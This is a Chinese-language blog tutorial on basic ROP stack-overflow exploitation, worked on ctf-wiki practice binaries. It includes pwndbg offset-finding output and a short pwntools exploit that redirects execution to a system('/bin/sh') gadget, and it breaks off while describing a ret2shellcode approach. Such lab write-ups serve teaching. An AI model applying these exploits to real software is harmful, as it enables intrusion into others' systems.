@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl">
+  
+  
+  
+  
+  <title>基本ROP | Thriumph</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="基本的rop">
+<meta name="keywords" content="pwn,re,渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基本ROP">
+<meta property="og:url" content="http://yoursite.com/基本ROP.html">
+<meta property="og:site_name" content="Thriumph">
+<meta property="og:description" content="基本的rop">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-53a567ad457ea63f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-e9867c7189002a23.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-f716e532c74f72e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-8bfae2f291f3781a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-51fc96af7865c480.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-0f89c8268607e17f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-a1f0e5f510519ae7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-0d369137abe9be78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-942e024f0254ff48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-beb336ea4aff2db7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-af2a943d204912b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-01fe2a0889398a35.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-4b315937e982dba4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-ebef5a512b86ca0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-2bd69024284bf0b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-bf381d3ffae8a9c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-da9d1eee326fdfde.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-bceda3bb3bb56509.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-61dc054548b12abb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-91245c53aa487e34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-85bdfd42059fd8f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/14577467-672cf02ac476fa47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-08-18T12:08:37.706Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基本ROP">
+<meta name="twitter:description" content="基本的rop">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/14577467-53a567ad457ea63f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+  
+    <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Thriumph</a></h1>
+        </hgroup>
+        
+        <p class="header-subtitle">路漫漫其修远兮，吾将上下而求索</p>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/">博客主页</a></li>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/tags/">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl qq"  target="_blank" href="#" title="qq">qq</a>
+                            
+                                <a class="fl mail"  target="_blank" href="#" title="mail">mail</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/HOOK技术/" style="font-size: 10px;">HOOK技术</a> <a href="/tags/PE文件/" style="font-size: 11.67px;">PE文件</a> <a href="/tags/c/" style="font-size: 10px;">c</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 18.33px;">pwnable.kr</a> <a href="/tags/re/" style="font-size: 13.33px;">re</a> <a href="/tags/wp/" style="font-size: 15px;">wp</a> <a href="/tags/加密算法/" style="font-size: 10px;">加密算法</a> <a href="/tags/汇编/" style="font-size: 11.67px;">汇编</a> <a href="/tags/注入技术/" style="font-size: 10px;">注入技术</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/补丁/" style="font-size: 10px;">补丁</a> <a href="/tags/计算机网络/" style="font-size: 16.67px;">计算机网络</a>
+                    </div>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">网安界的小萌新，喜欢逆向，二进制，日常划水，嘻嘻嘻ヾ(≧▽≦*)o</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Thriumph</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Thriumph</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">路漫漫其修远兮，吾将上下而求索</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="qq" target="_blank" href="#" title="qq">qq</a>
+                    
+                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-基本ROP" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/基本ROP.html" class="article-date">
+      <time datetime="2019-03-20T15:26:00.000Z" itemprop="datePublished">2019-03-20</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      基本ROP
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/二进制安全/">二进制安全</a>
+    </div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>基本的rop</p>
+<a id="more"></a>
+
+<h1 id="ROP攻击的前提"><a href="#ROP攻击的前提" class="headerlink" title="ROP攻击的前提"></a>ROP攻击的前提</h1><p>1.存在栈溢出并可以控制返回地址</p>
+<p>2.存在满足条件的gadget以及相应的gatget地址。如果开启了PIE保护则要想办法泄露gadget的地址。</p>
+<blockquote>
+<p>ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序</p>
+</blockquote>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><strong><code>原理：</code></strong>控制程序执行程序已有的代码。程序本身存在system(‘/bin/sh’)或execv(‘/bin/sh’)的片段，可以直接将返回地址覆盖位其地址跳转到已有的代码上。</p>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p><strong><code>原理：</code></strong>控制程序执行shellcode代码，通常用来获取目标系统的shell。需要自己构造shellcode并控制程序跳转到构造的shellcode处。（需要程序关闭NX）</p>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><strong><code>原理：</code></strong>控制程序执行系统调用获取shellcode（需要利用gedget构造系统调用）</p>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p><strong><code>原理：</code></strong>控制函数执行ret2libc中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<h1 id="例1-ret2text"><a href="#例1-ret2text" class="headerlink" title="例1(ret2text)"></a>例1(ret2text)</h1><p>ret2text：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text</a></p>
+<h2 id="查看保护措施"><a href="#查看保护措施" class="headerlink" title="查看保护措施"></a>查看保护措施</h2><p><img src="https://upload-images.jianshu.io/upload_images/14577467-53a567ad457ea63f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>开启了NX保护，所以不能在堆栈中写入shellcode</p>
+<h2 id="ida分析程序的溢出点"><a href="#ida分析程序的溢出点" class="headerlink" title="ida分析程序的溢出点"></a>ida分析程序的溢出点</h2><p>用ida查看，secure中存在调用 system(“/bin/sh”) 的代码</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/14577467-e9867c7189002a23.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/14577467-f716e532c74f72e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>所以直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。而gets函数会无限制的读取用户输入，必然会覆盖返回地址，所以要先确认覆盖多少位才会覆盖到返回地址。可以使用cyclic确定。</p>
+<h2 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>cyclic 200生成一个200个字节的字符串，然后确定输入的字符串第一个字节与ebp的距离</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/Thriumph/pwn/ret2text </span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Maybe I will tell you next time !</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0x62616163 (&apos;caab&apos;)</span><br><span class="line"> ESP  0xffffd070 ◂— 0x62616165 (&apos;eaab&apos;)</span><br><span class="line"> EIP  0x62616164 (&apos;daab&apos;)</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x62616164</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd070 ◂— 0x62616165 (&apos;eaab&apos;)</span><br><span class="line">01:0004│      0xffffd074 ◂— 0x62616166 (&apos;faab&apos;)</span><br><span class="line">02:0008│      0xffffd078 ◂— 0x62616167 (&apos;gaab&apos;)</span><br><span class="line">03:000c│      0xffffd07c ◂— 0x62616168 (&apos;haab&apos;)</span><br><span class="line">04:0010│      0xffffd080 ◂— 0x62616169 (&apos;iaab&apos;)</span><br><span class="line">05:0014│      0xffffd084 ◂— 0x6261616a (&apos;jaab&apos;)</span><br><span class="line">06:0018│      0xffffd088 ◂— 0x6261616b (&apos;kaab&apos;)</span><br><span class="line">07:001c│      0xffffd08c ◂— 0x6261616c (&apos;laab&apos;)</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 62616164</span><br><span class="line">   f 1 62616165</span><br><span class="line">   f 2 62616166</span><br><span class="line">   f 3 62616167</span><br><span class="line">   f 4 62616168</span><br><span class="line">   f 5 62616169</span><br><span class="line">   f 6 6261616a</span><br><span class="line">   f 7 6261616b</span><br><span class="line">   f 8 6261616c</span><br><span class="line">   f 9 6261616d</span><br><span class="line">   f 10 6261616e</span><br><span class="line">Program received signal SIGSEGV (fault address 0x62616164)</span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure>
+
+<p>计算出来的偏移是112，</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =process(<span class="string">'./ret2text'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">112</span>+p32(<span class="number">0x804863a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="例2-ret2shellcode"><a href="#例2-ret2shellcode" class="headerlink" title="例2(ret2shellcode)"></a>例2(ret2shellcode)</h1><p>（ret2shellcode）:<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode</a></p>
+<h2 id="查看保护措施-1"><a href="#查看保护措施-1" class="headerlink" title="查看保护措施"></a>查看保护措施</h2><p>查看文件，是一个32位的elf可执行文件，没有开启任何保护，NX没有开启，ip寄存器指向堆栈，shellcode在堆栈上或者其他数据段上，让ip寄存器指向哪里就可以获得shell</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/14577467-8bfae2f291f3781a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><p>用ida查看main函数，存在明显的栈溢出,gets()函数会不断地向s中写入，只有遇到\00才会停止，这样在栈中就会溢出覆盖掉返回地址。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/14577467-51fc96af7865c480.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="计算偏移-1"><a href="#计算偏移-1" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>和上题方法相同</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">Thriumph@ubuntu:~/pwn$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Thriumph@ubuntu:~/pwn$ pwndbg ret2shellcode</span><br><span class="line">Reading symbols from ret2shellcode...done.</span><br><span class="line">pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/Thriumph/pwn/ret2shellcode </span><br><span class="line">No system for you this time !!!</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">bye bye ~</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line"> EBP  0x62616163 (&apos;caab&apos;)</span><br><span class="line"> ESP  0xffffd070 ◂— 0x62616165 (&apos;eaab&apos;)</span><br><span class="line"> EIP  0x62616164 (&apos;daab&apos;)</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x62616164</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd070 ◂— 0x62616165 (&apos;eaab&apos;)</span><br><span class="line">01:0004│      0xffffd074 ◂— 0x62616166 (&apos;faab&apos;)</span><br><span class="line">02:0008│      0xffffd078 ◂— 0x62616167 (&apos;gaab&apos;)</span><br><span class="line">03:000c│      0xffffd07c ◂— 0x62616168 (&apos;haab&apos;)</span><br><span class="line">04:0010│      0xffffd080 ◂— 0x62616169 (&apos;iaab&apos;)</span><br><span class="line">05:0014│      0xffffd084 ◂— 0x6261616a (&apos;jaab&apos;)</span><br><span class="line">06:0018│      0xffffd088 ◂— 0x6261616b (&apos;kaab&apos;)</span><br><span class="line">07:001c│      0xffffd08c ◂— 0x6261616c (&apos;laab&apos;)</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 62616164</span><br><span class="line">   f 1 62616165</span><br><span class="line">   f 2 62616166</span><br><span class="line">   f 3 62616167</span><br><span class="line">   f 4 62616168</span><br><span class="line">   f 5 62616169</span><br><span class="line">   f 6 6261616a</span><br><span class="line">   f 7 6261616b</span><br><span class="line">   f 8 6261616c</span><br><span class="line">   f 9 6261616d</span><br><span class="line">   f 10 6261616e</span><br><span class="line">Program received signal SIGSEGV (fault address 0x62616164)</span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure>
+
+<p>偏移为112</p>
+<h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>程序中没有system()函数，所以不能利用程序内部的函数，需要写入shellcode<br><img src="https://upload-images.jianshu.io/upload_images/14577467-0f89c8268607e17f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>但调用了strncpy函数,strncpy(buf2,&amp;s,0x64u)，也就是将输入复制到buf2中，查看buf2<br><img src="https://upload-images.jianshu.io/upload_images/14577467-a1f0e5f510519ae7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>buf2在bss段中的，因为没有开启PIE,bss段的地址是固定的，所以将shellcode写入bss段中就可以获得shell了。</p>
+<p>整体思路就是返回地址被覆盖成shellcode地址,但程序并没有调用system()函数,所以不能利用程序内部的函数，这就需要写入shellcode，因为NX是关闭的，所以将shellcode写入.bss段，然后让返回地址指向shellcode。</p>
